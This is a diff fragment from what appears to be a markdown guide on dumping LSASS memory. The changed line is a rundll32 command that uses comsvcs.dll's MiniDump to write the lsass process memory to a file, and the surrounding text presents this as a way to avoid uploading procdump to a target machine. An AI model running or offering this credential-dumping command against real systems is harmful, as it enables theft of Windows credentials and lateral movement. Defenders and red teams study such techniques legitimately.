@@ -31,7 +31,7 @@ Execute it with [procdump64.exe](https://github.com/k4sth4/lsass-dump/blob/main/
 
 We can also use native DLLs instead of procdump64.exe, this way we don't have to upoad anything on target machine.
 ```markdown
-C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 556 C:\Users\Bob\Desktop\lsass.dmp full
+C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 556 C:\\Users\\Bob\\Desktop\\lsass.dmp full
 ```
 
 ![OnPaste 20220609-134015](https://user-images.githubusercontent.com/106917304/172800153-21110c80-b8a2-4bb0-a7cb-79e167041ec2.png)
